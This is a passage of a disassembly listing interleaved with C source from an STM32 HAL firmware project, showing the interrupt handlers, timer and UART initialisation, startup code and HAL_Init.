  /* USER CODE BEGIN NonMaskableInt_IRQn 0 */

  /* USER CODE END NonMaskableInt_IRQn 0 */
  /* USER CODE BEGIN NonMaskableInt_IRQn 1 */
   while (1)
 8000e2c:	e7fe      	b.n	8000e2c <NMI_Handler+0x4>

08000e2e <HardFault_Handler>:

/**
  * @brief This function handles Hard fault interrupt.
  */
void HardFault_Handler(void)
{
 8000e2e:	b480      	push	{r7}
 8000e30:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN HardFault_IRQn 0 */

  /* USER CODE END HardFault_IRQn 0 */
  while (1)
 8000e32:	e7fe      	b.n	8000e32 <HardFault_Handler+0x4>

08000e34 <MemManage_Handler>:

/**
  * @brief This function handles Memory management fault.
  */
void MemManage_Handler(void)
{
 8000e34:	b480      	push	{r7}
 8000e36:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN MemoryManagement_IRQn 0 */

  /* USER CODE END MemoryManagement_IRQn 0 */
  while (1)
 8000e38:	e7fe      	b.n	8000e38 <MemManage_Handler+0x4>

08000e3a <BusFault_Handler>:

/**
  * @brief This function handles Prefetch fault, memory access fault.
  */
void BusFault_Handler(void)
{
 8000e3a:	b480      	push	{r7}
 8000e3c:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN BusFault_IRQn 0 */

  /* USER CODE END BusFault_IRQn 0 */
  while (1)
 8000e3e:	e7fe      	b.n	8000e3e <BusFault_Handler+0x4>

08000e40 <UsageFault_Handler>:

/**
  * @brief This function handles Undefined instruction or illegal state.
  */
void UsageFault_Handler(void)
{
 8000e40:	b480      	push	{r7}
 8000e42:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN UsageFault_IRQn 0 */

  /* USER CODE END UsageFault_IRQn 0 */
  while (1)
 8000e44:	e7fe      	b.n	8000e44 <UsageFault_Handler+0x4>

08000e46 <SVC_Handler>:

/**
  * @brief This function handles System service call via SWI instruction.
  */
void SVC_Handler(void)
{
 8000e46:	b480      	push	{r7}
 8000e48:	af00      	add	r7, sp, #0

  /* USER CODE END SVCall_IRQn 0 */
  /* USER CODE BEGIN SVCall_IRQn 1 */

  /* USER CODE END SVCall_IRQn 1 */
}
 8000e4a:	bf00      	nop
 8000e4c:	46bd      	mov	sp, r7
 8000e4e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000e52:	4770      	bx	lr

08000e54 <DebugMon_Handler>:

/**
  * @brief This function handles Debug monitor.
  */
void DebugMon_Handler(void)
{
 8000e54:	b480      	push	{r7}
 8000e56:	af00      	add	r7, sp, #0

  /* USER CODE END DebugMonitor_IRQn 0 */
  /* USER CODE BEGIN DebugMonitor_IRQn 1 */

  /* USER CODE END DebugMonitor_IRQn 1 */
}
 8000e58:	bf00      	nop
 8000e5a:	46bd      	mov	sp, r7
 8000e5c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000e60:	4770      	bx	lr

08000e62 <PendSV_Handler>:

/**
  * @brief This function handles Pendable request for system service.
  */
void PendSV_Handler(void)
{
 8000e62:	b480      	push	{r7}
 8000e64:	af00      	add	r7, sp, #0

  /* USER CODE END PendSV_IRQn 0 */
  /* USER CODE BEGIN PendSV_IRQn 1 */

  /* USER CODE END PendSV_IRQn 1 */
}
 8000e66:	bf00      	nop
 8000e68:	46bd      	mov	sp, r7
 8000e6a:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000e6e:	4770      	bx	lr

08000e70 <SysTick_Handler>:

/**
  * @brief This function handles System tick timer.
  */
void SysTick_Handler(void)
{
 8000e70:	b580      	push	{r7, lr}
 8000e72:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN SysTick_IRQn 0 */

  /* USER CODE END SysTick_IRQn 0 */
  HAL_IncTick();
 8000e74:	f000 f9b2 	bl	80011dc <HAL_IncTick>
  /* USER CODE BEGIN SysTick_IRQn 1 */

  /* USER CODE END SysTick_IRQn 1 */
}
 8000e78:	bf00      	nop
 8000e7a:	bd80      	pop	{r7, pc}

08000e7c <TIM2_IRQHandler>:

/**
  * @brief This function handles TIM2 global interrupt.
  */
void TIM2_IRQHandler(void)
{
 8000e7c:	b580      	push	{r7, lr}
 8000e7e:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN TIM2_IRQn 0 */

  /* USER CODE END TIM2_IRQn 0 */
  HAL_TIM_IRQHandler(&htim2);
 8000e80:	4802      	ldr	r0, [pc, #8]	; (8000e8c <TIM2_IRQHandler+0x10>)
 8000e82:	f003 ffc1 	bl	8004e08 <HAL_TIM_IRQHandler>
  /* USER CODE BEGIN TIM2_IRQn 1 */

  /* USER CODE END TIM2_IRQn 1 */
}
 8000e86:	bf00      	nop
 8000e88:	bd80      	pop	{r7, pc}
 8000e8a:	bf00      	nop
 8000e8c:	200002e4 	.word	0x200002e4

08000e90 <USB_IRQHandler>:

/**
  * @brief This function handles USB event interrupt through EXTI line 17.
  */
void USB_IRQHandler(void)
{
 8000e90:	b580      	push	{r7, lr}
 8000e92:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_IRQn 0 */

  /* USER CODE END USB_IRQn 0 */
  HAL_PCD_IRQHandler(&hpcd_USB_FS);
 8000e94:	4802      	ldr	r0, [pc, #8]	; (8000ea0 <USB_IRQHandler+0x10>)
 8000e96:	f001 f819 	bl	8001ecc <HAL_PCD_IRQHandler>
  /* USER CODE BEGIN USB_IRQn 1 */

  /* USER CODE END USB_IRQn 1 */
}
 8000e9a:	bf00      	nop
 8000e9c:	bd80      	pop	{r7, pc}
 8000e9e:	bf00      	nop
 8000ea0:	20000b7c 	.word	0x20000b7c

08000ea4 <SystemInit>:
  * @brief  Setup the microcontroller system.
  * @retval None
  */

void SystemInit(void)
{
 8000ea4:	b480      	push	{r7}
 8000ea6:	af00      	add	r7, sp, #0
  SCB->VTOR = VECT_TAB_BASE_ADDRESS | VECT_TAB_OFFSET;
#endif

  /* FPU settings ------------------------------------------------------------*/
#if (__FPU_PRESENT == 1) && (__FPU_USED == 1)
  SCB->CPACR |= ((3UL << 20U)|(3UL << 22U));  /* set CP10 and CP11 Full Access */
 8000ea8:	4b06      	ldr	r3, [pc, #24]	; (8000ec4 <SystemInit+0x20>)
 8000eaa:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8000eae:	4a05      	ldr	r2, [pc, #20]	; (8000ec4 <SystemInit+0x20>)
 8000eb0:	f443 0370 	orr.w	r3, r3, #15728640	; 0xf00000
 8000eb4:	f8c2 3088 	str.w	r3, [r2, #136]	; 0x88
#endif
}
 8000eb8:	bf00      	nop
 8000eba:	46bd      	mov	sp, r7
 8000ebc:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000ec0:	4770      	bx	lr
 8000ec2:	bf00      	nop
 8000ec4:	e000ed00 	.word	0xe000ed00

08000ec8 <MX_TIM2_Init>:

TIM_HandleTypeDef htim2;

/* TIM2 init function */
void MX_TIM2_Init(void)
{
 8000ec8:	b580      	push	{r7, lr}
 8000eca:	b088      	sub	sp, #32
 8000ecc:	af00      	add	r7, sp, #0

  /* USER CODE BEGIN TIM2_Init 0 */

  /* USER CODE END TIM2_Init 0 */

  TIM_ClockConfigTypeDef sClockSourceConfig = {0};
 8000ece:	f107 0310 	add.w	r3, r7, #16
 8000ed2:	2200      	movs	r2, #0
 8000ed4:	601a      	str	r2, [r3, #0]
 8000ed6:	605a      	str	r2, [r3, #4]
 8000ed8:	609a      	str	r2, [r3, #8]
 8000eda:	60da      	str	r2, [r3, #12]
  TIM_MasterConfigTypeDef sMasterConfig = {0};
 8000edc:	1d3b      	adds	r3, r7, #4
 8000ede:	2200      	movs	r2, #0
 8000ee0:	601a      	str	r2, [r3, #0]
 8000ee2:	605a      	str	r2, [r3, #4]
 8000ee4:	609a      	str	r2, [r3, #8]

  /* USER CODE BEGIN TIM2_Init 1 */

  /* USER CODE END TIM2_Init 1 */
  htim2.Instance = TIM2;
 8000ee6:	4b1e      	ldr	r3, [pc, #120]	; (8000f60 <MX_TIM2_Init+0x98>)
 8000ee8:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000eec:	601a      	str	r2, [r3, #0]
  htim2.Init.Prescaler = 7199;
 8000eee:	4b1c      	ldr	r3, [pc, #112]	; (8000f60 <MX_TIM2_Init+0x98>)
 8000ef0:	f641 421f 	movw	r2, #7199	; 0x1c1f
 8000ef4:	605a      	str	r2, [r3, #4]
  htim2.Init.CounterMode = TIM_COUNTERMODE_UP;
 8000ef6:	4b1a      	ldr	r3, [pc, #104]	; (8000f60 <MX_TIM2_Init+0x98>)
 8000ef8:	2200      	movs	r2, #0
 8000efa:	609a      	str	r2, [r3, #8]
  htim2.Init.Period = 399;
 8000efc:	4b18      	ldr	r3, [pc, #96]	; (8000f60 <MX_TIM2_Init+0x98>)
 8000efe:	f240 128f 	movw	r2, #399	; 0x18f
 8000f02:	60da      	str	r2, [r3, #12]
  htim2.Init.ClockDivision = TIM_CLOCKDIVISION_DIV1;
 8000f04:	4b16      	ldr	r3, [pc, #88]	; (8000f60 <MX_TIM2_Init+0x98>)
 8000f06:	2200      	movs	r2, #0
 8000f08:	611a      	str	r2, [r3, #16]
  htim2.Init.AutoReloadPreload = TIM_AUTORELOAD_PRELOAD_DISABLE;
 8000f0a:	4b15      	ldr	r3, [pc, #84]	; (8000f60 <MX_TIM2_Init+0x98>)
 8000f0c:	2200      	movs	r2, #0
 8000f0e:	619a      	str	r2, [r3, #24]
  if (HAL_TIM_Base_Init(&htim2) != HAL_OK)
 8000f10:	4813      	ldr	r0, [pc, #76]	; (8000f60 <MX_TIM2_Init+0x98>)
 8000f12:	f003 fece 	bl	8004cb2 <HAL_TIM_Base_Init>
 8000f16:	4603      	mov	r3, r0
 8000f18:	2b00      	cmp	r3, #0
 8000f1a:	d001      	beq.n	8000f20 <MX_TIM2_Init+0x58>
  {
    Error_Handler();
 8000f1c:	f7ff feda 	bl	8000cd4 <Error_Handler>
  }
  sClockSourceConfig.ClockSource = TIM_CLOCKSOURCE_INTERNAL;
 8000f20:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 8000f24:	613b      	str	r3, [r7, #16]
  if (HAL_TIM_ConfigClockSource(&htim2, &sClockSourceConfig) != HAL_OK)
 8000f26:	f107 0310 	add.w	r3, r7, #16
 8000f2a:	4619      	mov	r1, r3
 8000f2c:	480c      	ldr	r0, [pc, #48]	; (8000f60 <MX_TIM2_Init+0x98>)
 8000f2e:	f004 f86d 	bl	800500c <HAL_TIM_ConfigClockSource>
 8000f32:	4603      	mov	r3, r0
 8000f34:	2b00      	cmp	r3, #0
 8000f36:	d001      	beq.n	8000f3c <MX_TIM2_Init+0x74>
  {
    Error_Handler();
 8000f38:	f7ff fecc 	bl	8000cd4 <Error_Handler>
  }
  sMasterConfig.MasterOutputTrigger = TIM_TRGO_RESET;
 8000f3c:	2300      	movs	r3, #0
 8000f3e:	607b      	str	r3, [r7, #4]
  sMasterConfig.MasterSlaveMode = TIM_MASTERSLAVEMODE_DISABLE;
 8000f40:	2300      	movs	r3, #0
 8000f42:	60fb      	str	r3, [r7, #12]
  if (HAL_TIMEx_MasterConfigSynchronization(&htim2, &sMasterConfig) != HAL_OK)
 8000f44:	1d3b      	adds	r3, r7, #4
 8000f46:	4619      	mov	r1, r3
 8000f48:	4805      	ldr	r0, [pc, #20]	; (8000f60 <MX_TIM2_Init+0x98>)
 8000f4a:	f004 fa4f 	bl	80053ec <HAL_TIMEx_MasterConfigSynchronization>
 8000f4e:	4603      	mov	r3, r0
 8000f50:	2b00      	cmp	r3, #0
 8000f52:	d001      	beq.n	8000f58 <MX_TIM2_Init+0x90>
  {
    Error_Handler();
 8000f54:	f7ff febe 	bl	8000cd4 <Error_Handler>
  }
  /* USER CODE BEGIN TIM2_Init 2 */

  /* USER CODE END TIM2_Init 2 */

}
 8000f58:	bf00      	nop
 8000f5a:	3720      	adds	r7, #32
 8000f5c:	46bd      	mov	sp, r7
 8000f5e:	bd80      	pop	{r7, pc}
 8000f60:	200002e4 	.word	0x200002e4

08000f64 <HAL_TIM_Base_MspInit>:

void HAL_TIM_Base_MspInit(TIM_HandleTypeDef* tim_baseHandle)
{
 8000f64:	b580      	push	{r7, lr}
 8000f66:	b084      	sub	sp, #16
 8000f68:	af00      	add	r7, sp, #0
 8000f6a:	6078      	str	r0, [r7, #4]

  if(tim_baseHandle->Instance==TIM2)
 8000f6c:	687b      	ldr	r3, [r7, #4]
 8000f6e:	681b      	ldr	r3, [r3, #0]
 8000f70:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8000f74:	d113      	bne.n	8000f9e <HAL_TIM_Base_MspInit+0x3a>
  {
  /* USER CODE BEGIN TIM2_MspInit 0 */

  /* USER CODE END TIM2_MspInit 0 */
    /* TIM2 clock enable */
    __HAL_RCC_TIM2_CLK_ENABLE();
 8000f76:	4b0c      	ldr	r3, [pc, #48]	; (8000fa8 <HAL_TIM_Base_MspInit+0x44>)
 8000f78:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000f7a:	4a0b      	ldr	r2, [pc, #44]	; (8000fa8 <HAL_TIM_Base_MspInit+0x44>)
 8000f7c:	f043 0301 	orr.w	r3, r3, #1
 8000f80:	6593      	str	r3, [r2, #88]	; 0x58
 8000f82:	4b09      	ldr	r3, [pc, #36]	; (8000fa8 <HAL_TIM_Base_MspInit+0x44>)
 8000f84:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000f86:	f003 0301 	and.w	r3, r3, #1
 8000f8a:	60fb      	str	r3, [r7, #12]
 8000f8c:	68fb      	ldr	r3, [r7, #12]

    /* TIM2 interrupt Init */
    HAL_NVIC_SetPriority(TIM2_IRQn, 0, 0);
 8000f8e:	2200      	movs	r2, #0
 8000f90:	2100      	movs	r1, #0
 8000f92:	201c      	movs	r0, #28
 8000f94:	f000 fa41 	bl	800141a <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(TIM2_IRQn);
 8000f98:	201c      	movs	r0, #28
 8000f9a:	f000 fa5a 	bl	8001452 <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN TIM2_MspInit 1 */

  /* USER CODE END TIM2_MspInit 1 */
  }
}
 8000f9e:	bf00      	nop
 8000fa0:	3710      	adds	r7, #16
 8000fa2:	46bd      	mov	sp, r7
 8000fa4:	bd80      	pop	{r7, pc}
 8000fa6:	bf00      	nop
 8000fa8:	40021000 	.word	0x40021000

08000fac <MX_USART2_UART_Init>:
UART_HandleTypeDef huart2;

/* USART2 init function */

void MX_USART2_UART_Init(void)
{
 8000fac:	b580      	push	{r7, lr}
 8000fae:	af00      	add	r7, sp, #0
  /* USER CODE END USART2_Init 0 */

  /* USER CODE BEGIN USART2_Init 1 */

  /* USER CODE END USART2_Init 1 */
  huart2.Instance = USART2;
 8000fb0:	4b14      	ldr	r3, [pc, #80]	; (8001004 <MX_USART2_UART_Init+0x58>)
 8000fb2:	4a15      	ldr	r2, [pc, #84]	; (8001008 <MX_USART2_UART_Init+0x5c>)
 8000fb4:	601a      	str	r2, [r3, #0]
  huart2.Init.BaudRate = 115200;
 8000fb6:	4b13      	ldr	r3, [pc, #76]	; (8001004 <MX_USART2_UART_Init+0x58>)
 8000fb8:	f44f 32e1 	mov.w	r2, #115200	; 0x1c200
 8000fbc:	605a      	str	r2, [r3, #4]
  huart2.Init.WordLength = UART_WORDLENGTH_8B;
 8000fbe:	4b11      	ldr	r3, [pc, #68]	; (8001004 <MX_USART2_UART_Init+0x58>)
 8000fc0:	2200      	movs	r2, #0
 8000fc2:	609a      	str	r2, [r3, #8]
  huart2.Init.StopBits = UART_STOPBITS_1;
 8000fc4:	4b0f      	ldr	r3, [pc, #60]	; (8001004 <MX_USART2_UART_Init+0x58>)
 8000fc6:	2200      	movs	r2, #0
 8000fc8:	60da      	str	r2, [r3, #12]
  huart2.Init.Parity = UART_PARITY_NONE;
 8000fca:	4b0e      	ldr	r3, [pc, #56]	; (8001004 <MX_USART2_UART_Init+0x58>)
 8000fcc:	2200      	movs	r2, #0
 8000fce:	611a      	str	r2, [r3, #16]
  huart2.Init.Mode = UART_MODE_TX_RX;
 8000fd0:	4b0c      	ldr	r3, [pc, #48]	; (8001004 <MX_USART2_UART_Init+0x58>)
 8000fd2:	220c      	movs	r2, #12
 8000fd4:	615a      	str	r2, [r3, #20]
  huart2.Init.HwFlowCtl = UART_HWCONTROL_NONE;
 8000fd6:	4b0b      	ldr	r3, [pc, #44]	; (8001004 <MX_USART2_UART_Init+0x58>)
 8000fd8:	2200      	movs	r2, #0
 8000fda:	619a      	str	r2, [r3, #24]
  huart2.Init.OverSampling = UART_OVERSAMPLING_16;
 8000fdc:	4b09      	ldr	r3, [pc, #36]	; (8001004 <MX_USART2_UART_Init+0x58>)
 8000fde:	2200      	movs	r2, #0
 8000fe0:	61da      	str	r2, [r3, #28]
  huart2.Init.OneBitSampling = UART_ONE_BIT_SAMPLE_DISABLE;
 8000fe2:	4b08      	ldr	r3, [pc, #32]	; (8001004 <MX_USART2_UART_Init+0x58>)
 8000fe4:	2200      	movs	r2, #0
 8000fe6:	621a      	str	r2, [r3, #32]
  huart2.AdvancedInit.AdvFeatureInit = UART_ADVFEATURE_NO_INIT;
 8000fe8:	4b06      	ldr	r3, [pc, #24]	; (8001004 <MX_USART2_UART_Init+0x58>)
 8000fea:	2200      	movs	r2, #0
 8000fec:	625a      	str	r2, [r3, #36]	; 0x24
  if (HAL_UART_Init(&huart2) != HAL_OK)
 8000fee:	4805      	ldr	r0, [pc, #20]	; (8001004 <MX_USART2_UART_Init+0x58>)
 8000ff0:	f004 fa80 	bl	80054f4 <HAL_UART_Init>
 8000ff4:	4603      	mov	r3, r0
 8000ff6:	2b00      	cmp	r3, #0
 8000ff8:	d001      	beq.n	8000ffe <MX_USART2_UART_Init+0x52>
  {
    Error_Handler();
 8000ffa:	f7ff fe6b 	bl	8000cd4 <Error_Handler>
  }
  /* USER CODE BEGIN USART2_Init 2 */

  /* USER CODE END USART2_Init 2 */

}
 8000ffe:	bf00      	nop
 8001000:	bd80      	pop	{r7, pc}
 8001002:	bf00      	nop
 8001004:	20000330 	.word	0x20000330
 8001008:	40004400 	.word	0x40004400

0800100c <HAL_UART_MspInit>:

void HAL_UART_MspInit(UART_HandleTypeDef* uartHandle)
{
 800100c:	b580      	push	{r7, lr}
 800100e:	b09e      	sub	sp, #120	; 0x78
 8001010:	af00      	add	r7, sp, #0
 8001012:	6078      	str	r0, [r7, #4]

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 8001014:	f107 0364 	add.w	r3, r7, #100	; 0x64
 8001018:	2200      	movs	r2, #0
 800101a:	601a      	str	r2, [r3, #0]
 800101c:	605a      	str	r2, [r3, #4]
 800101e:	609a      	str	r2, [r3, #8]
 8001020:	60da      	str	r2, [r3, #12]
 8001022:	611a      	str	r2, [r3, #16]
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};
 8001024:	f107 0310 	add.w	r3, r7, #16
 8001028:	2254      	movs	r2, #84	; 0x54
 800102a:	2100      	movs	r1, #0
 800102c:	4618      	mov	r0, r3
 800102e:	f00b ffff 	bl	800d030 <memset>
  if(uartHandle->Instance==USART2)
 8001032:	687b      	ldr	r3, [r7, #4]
 8001034:	681b      	ldr	r3, [r3, #0]
 8001036:	4a28      	ldr	r2, [pc, #160]	; (80010d8 <HAL_UART_MspInit+0xcc>)
 8001038:	4293      	cmp	r3, r2
 800103a:	d148      	bne.n	80010ce <HAL_UART_MspInit+0xc2>

  /* USER CODE END USART2_MspInit 0 */

  /** Initializes the peripherals clock
  */
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USART2;
 800103c:	2302      	movs	r3, #2
 800103e:	613b      	str	r3, [r7, #16]
    PeriphClkInit.Usart2ClockSelection = RCC_USART2CLKSOURCE_PCLK1;
 8001040:	2300      	movs	r3, #0
 8001042:	637b      	str	r3, [r7, #52]	; 0x34
    if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
 8001044:	f107 0310 	add.w	r3, r7, #16
 8001048:	4618      	mov	r0, r3
 800104a:	f003 fa97 	bl	800457c <HAL_RCCEx_PeriphCLKConfig>
 800104e:	4603      	mov	r3, r0
 8001050:	2b00      	cmp	r3, #0
 8001052:	d001      	beq.n	8001058 <HAL_UART_MspInit+0x4c>
    {
      Error_Handler();
 8001054:	f7ff fe3e 	bl	8000cd4 <Error_Handler>
    }

    /* USART2 clock enable */
    __HAL_RCC_USART2_CLK_ENABLE();
 8001058:	4b20      	ldr	r3, [pc, #128]	; (80010dc <HAL_UART_MspInit+0xd0>)
 800105a:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800105c:	4a1f      	ldr	r2, [pc, #124]	; (80010dc <HAL_UART_MspInit+0xd0>)
 800105e:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
 8001062:	6593      	str	r3, [r2, #88]	; 0x58
 8001064:	4b1d      	ldr	r3, [pc, #116]	; (80010dc <HAL_UART_MspInit+0xd0>)
 8001066:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8001068:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 800106c:	60fb      	str	r3, [r7, #12]
 800106e:	68fb      	ldr	r3, [r7, #12]

    __HAL_RCC_GPIOA_CLK_ENABLE();
 8001070:	4b1a      	ldr	r3, [pc, #104]	; (80010dc <HAL_UART_MspInit+0xd0>)
 8001072:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8001074:	4a19      	ldr	r2, [pc, #100]	; (80010dc <HAL_UART_MspInit+0xd0>)
 8001076:	f043 0301 	orr.w	r3, r3, #1
 800107a:	64d3      	str	r3, [r2, #76]	; 0x4c
 800107c:	4b17      	ldr	r3, [pc, #92]	; (80010dc <HAL_UART_MspInit+0xd0>)
 800107e:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8001080:	f003 0301 	and.w	r3, r3, #1
 8001084:	60bb      	str	r3, [r7, #8]
 8001086:	68bb      	ldr	r3, [r7, #8]
    /**USART2 GPIO Configuration
    PA2     ------> USART2_TX
    PA15 (JTDI)     ------> USART2_RX
    */
    GPIO_InitStruct.Pin = VCP_TX_Pin;
 8001088:	2304      	movs	r3, #4
 800108a:	667b      	str	r3, [r7, #100]	; 0x64
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 800108c:	2302      	movs	r3, #2
 800108e:	66bb      	str	r3, [r7, #104]	; 0x68
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8001090:	2300      	movs	r3, #0
 8001092:	66fb      	str	r3, [r7, #108]	; 0x6c
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8001094:	2303      	movs	r3, #3
 8001096:	673b      	str	r3, [r7, #112]	; 0x70
    GPIO_InitStruct.Alternate = GPIO_AF7_USART2;
 8001098:	2307      	movs	r3, #7
 800109a:	677b      	str	r3, [r7, #116]	; 0x74
    HAL_GPIO_Init(VCP_TX_GPIO_Port, &GPIO_InitStruct);
 800109c:	f107 0364 	add.w	r3, r7, #100	; 0x64
 80010a0:	4619      	mov	r1, r3
 80010a2:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 80010a6:	f000 fc67 	bl	8001978 <HAL_GPIO_Init>

    GPIO_InitStruct.Pin = VCP_RX_Pin;
 80010aa:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 80010ae:	667b      	str	r3, [r7, #100]	; 0x64
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 80010b0:	2302      	movs	r3, #2
 80010b2:	66bb      	str	r3, [r7, #104]	; 0x68
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 80010b4:	2300      	movs	r3, #0
 80010b6:	66fb      	str	r3, [r7, #108]	; 0x6c
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 80010b8:	2303      	movs	r3, #3
 80010ba:	673b      	str	r3, [r7, #112]	; 0x70
    GPIO_InitStruct.Alternate = GPIO_AF3_USART2;
 80010bc:	2303      	movs	r3, #3
 80010be:	677b      	str	r3, [r7, #116]	; 0x74
    HAL_GPIO_Init(VCP_RX_GPIO_Port, &GPIO_InitStruct);
 80010c0:	f107 0364 	add.w	r3, r7, #100	; 0x64
 80010c4:	4619      	mov	r1, r3
 80010c6:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 80010ca:	f000 fc55 	bl	8001978 <HAL_GPIO_Init>

  /* USER CODE BEGIN USART2_MspInit 1 */

  /* USER CODE END USART2_MspInit 1 */
  }
}
 80010ce:	bf00      	nop
 80010d0:	3778      	adds	r7, #120	; 0x78
 80010d2:	46bd      	mov	sp, r7
 80010d4:	bd80      	pop	{r7, pc}
 80010d6:	bf00      	nop
 80010d8:	40004400 	.word	0x40004400
 80010dc:	40021000 	.word	0x40021000

080010e0 <Reset_Handler>:

    .section	.text.Reset_Handler
	.weak	Reset_Handler
	.type	Reset_Handler, %function
Reset_Handler:
  ldr   sp, =_estack    /* Set stack pointer */
 80010e0:	f8df d034 	ldr.w	sp, [pc, #52]	; 8001118 <LoopForever+0x2>

/* Call the clock system initialization function.*/
    bl  SystemInit
 80010e4:	f7ff fede 	bl	8000ea4 <SystemInit>

/* Copy the data segment initializers from flash to SRAM */
  ldr r0, =_sdata
 80010e8:	480c      	ldr	r0, [pc, #48]	; (800111c <LoopForever+0x6>)
  ldr r1, =_edata
 80010ea:	490d      	ldr	r1, [pc, #52]	; (8001120 <LoopForever+0xa>)
  ldr r2, =_sidata
 80010ec:	4a0d      	ldr	r2, [pc, #52]	; (8001124 <LoopForever+0xe>)
  movs r3, #0
 80010ee:	2300      	movs	r3, #0
  b LoopCopyDataInit
 80010f0:	e002      	b.n	80010f8 <LoopCopyDataInit>

080010f2 <CopyDataInit>:

CopyDataInit:
  ldr r4, [r2, r3]
 80010f2:	58d4      	ldr	r4, [r2, r3]
  str r4, [r0, r3]
 80010f4:	50c4      	str	r4, [r0, r3]
  adds r3, r3, #4
 80010f6:	3304      	adds	r3, #4

080010f8 <LoopCopyDataInit>:

LoopCopyDataInit:
  adds r4, r0, r3
 80010f8:	18c4      	adds	r4, r0, r3
  cmp r4, r1
 80010fa:	428c      	cmp	r4, r1
  bcc CopyDataInit
 80010fc:	d3f9      	bcc.n	80010f2 <CopyDataInit>
  
/* Zero fill the bss segment. */
  ldr r2, =_sbss
 80010fe:	4a0a      	ldr	r2, [pc, #40]	; (8001128 <LoopForever+0x12>)
  ldr r4, =_ebss
 8001100:	4c0a      	ldr	r4, [pc, #40]	; (800112c <LoopForever+0x16>)
  movs r3, #0
 8001102:	2300      	movs	r3, #0
  b LoopFillZerobss
 8001104:	e001      	b.n	800110a <LoopFillZerobss>

08001106 <FillZerobss>:

FillZerobss:
  str  r3, [r2]
 8001106:	6013      	str	r3, [r2, #0]
  adds r2, r2, #4
 8001108:	3204      	adds	r2, #4

0800110a <LoopFillZerobss>:

LoopFillZerobss:
  cmp r2, r4
 800110a:	42a2      	cmp	r2, r4
  bcc FillZerobss
 800110c:	d3fb      	bcc.n	8001106 <FillZerobss>

/* Call static constructors */
    bl __libc_init_array
 800110e:	f00b ff97 	bl	800d040 <__libc_init_array>
/* Call the application's entry point.*/
	bl	main
 8001112:	f7ff fa39 	bl	8000588 <main>

08001116 <LoopForever>:

LoopForever:
    b LoopForever
 8001116:	e7fe      	b.n	8001116 <LoopForever>
  ldr   sp, =_estack    /* Set stack pointer */
 8001118:	20010000 	.word	0x20010000
  ldr r0, =_sdata
 800111c:	20000000 	.word	0x20000000
  ldr r1, =_edata
 8001120:	20000240 	.word	0x20000240
  ldr r2, =_sidata
 8001124:	0800d2f4 	.word	0x0800d2f4
  ldr r2, =_sbss
 8001128:	20000240 	.word	0x20000240
  ldr r4, =_ebss
 800112c:	20001f14 	.word	0x20001f14

08001130 <ADC1_IRQHandler>:
 * @retval : None
*/
    .section	.text.Default_Handler,"ax",%progbits
Default_Handler:
Infinite_Loop:
	b	Infinite_Loop
 8001130:	e7fe      	b.n	8001130 <ADC1_IRQHandler>

08001132 <HAL_Init>:
  *         each 1ms in the SysTick_Handler() interrupt handler.
  *
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_Init(void)
{
 8001132:	b580      	push	{r7, lr}
 8001134:	b082      	sub	sp, #8
 8001136:	af00      	add	r7, sp, #0
  HAL_StatusTypeDef  status = HAL_OK;
 8001138:	2300      	movs	r3, #0
 800113a:	71fb      	strb	r3, [r7, #7]
#if (PREFETCH_ENABLE != 0)
  __HAL_FLASH_PREFETCH_BUFFER_ENABLE();
#endif /* PREFETCH_ENABLE */

  /* Set Interrupt Group Priority */
  HAL_NVIC_SetPriorityGrouping(NVIC_PRIORITYGROUP_4);
 800113c:	2003      	movs	r0, #3
 800113e:	f000 f961 	bl	8001404 <HAL_NVIC_SetPriorityGrouping>

  /* Use SysTick as time base source and configure 1ms tick (default clock after Reset is MSI) */
  if (HAL_InitTick(TICK_INT_PRIORITY) != HAL_OK)
 8001142:	2000      	movs	r0, #0
 8001144:	f000 f80e 	bl	8001164 <HAL_InitTick>
 8001148:	4603      	mov	r3, r0
 800114a:	2b00      	cmp	r3, #0
 800114c:	d002      	beq.n	8001154 <HAL_Init+0x22>
  {
    status = HAL_ERROR;
 800114e:	2301      	movs	r3, #1
 8001150:	71fb      	strb	r3, [r7, #7]
 8001152:	e001      	b.n	8001158 <HAL_Init+0x26>
  }
  else
  {
    /* Init the low level hardware */
    HAL_MspInit();
 8001154:	f7ff fe44 	bl	8000de0 <HAL_MspInit>
  }

  /* Return function status */
  return status;
 8001158:	79fb      	ldrb	r3, [r7, #7]
}
 800115a:	4618      	mov	r0, r3
 800115c:	3708      	adds	r7, #8
 800115e:	46bd      	mov	sp, r7
 8001160:	bd80      	pop	{r7, pc}
	...

